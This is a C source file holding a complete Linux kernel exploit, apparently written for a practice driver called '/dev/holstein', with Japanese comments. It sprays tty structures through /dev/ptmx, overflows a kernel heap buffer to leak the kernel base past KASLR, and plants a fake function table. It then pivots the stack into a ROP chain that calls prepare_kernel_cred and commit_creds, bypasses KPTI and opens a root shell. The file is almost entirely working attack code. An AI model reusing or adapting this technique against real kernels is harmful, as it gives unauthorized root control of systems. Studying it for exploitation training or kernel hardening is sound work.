#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define ofs_tty_ops 0xc38880
#define addr_commit_creds (kbase + 0x0744b0)
#define addr_prepare_kernel_cred (kbase + 0x074650)
#define rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp (kbase + 0x3a478a)
#define rop_pop_rdi (kbase + 0x0d748d)
#define rop_pop_rcx (kbase + 0x13c1c4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x62707b)
#define rop_bypass_kpti (kbase + 0x800e26)

unsigned long kbase, g_buf;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win(){
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void save_state(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

void fatal(const char *msg){
    perror(msg);
    exit(1);
}

int main(){
    save_state();
    int spray[100];

    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            fatal("/dev/ptmx");
    }

    // 周囲にtty_structがある位置
    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1)
      fatal("/dev/holstein");

    for (int i = 50; i < 100; i++) {
      spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
      if (spray[i] == -1)
        fatal("/dev/ptmx");
    }

    // Bypass KASLR
    char buf[0x500];
    read(fd, buf, 0x500);
    kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);

    // g_bufのアドレスリーク
    // オフセット0x38はtty_structの中を指す
    g_buf = *(unsigned long*)&buf[0x438] - (0x400 + 0x38);
    printf("[+] g_buf = 0x%016lx\n", g_buf);

    // bufの先頭から0x40分を偽関数テーブル
    /*
    unsigned long *p = (unsigned long*)&buf;
    for (int i = 0; i < 0x40; i++) {
        *p++ = 0xffffffffdead0000 + (i << 8);
    }

    // tty_structの関数テーブルops(+0x18)
    *(unsigned long*)&buf[0x418] = g_buf;
    write(fd, buf, 0x420);

    for (int i = 0; i < 100; i++) {
        ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
    }
    */
    // => RIP: 0010:0xffffffffdead0c00(12番目)

    // 偽関数テーブルの書き込み
    unsigned long *p = (unsigned long*)&buf[0x400];
    p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
    *(unsigned long*)&buf[0x418] = g_buf + 0x400;

    // ROP Chain
    unsigned long *chain = (unsigned long*)&buf;
    *chain++ = rop_pop_rdi;
    *chain++ = 0;
    *chain++ = addr_prepare_kernel_cred;
    *chain++ = rop_pop_rcx;
    *chain++ = 0;
    *chain++ = rop_mov_rdi_rax_rep_movsq;
    *chain++ = addr_commit_creds;
    *chain++ = rop_bypass_kpti;
    *chain++ = 0xdeadbeef;
    *chain++ = 0xcafebabe;
    *chain++ = (unsigned long)&win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    write(fd, buf, 0x500);

    for (int i = 0; i < 100; i++) {
        ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); // r13, rbpの分を引く
    }

    close(fd);
    return 0;
}
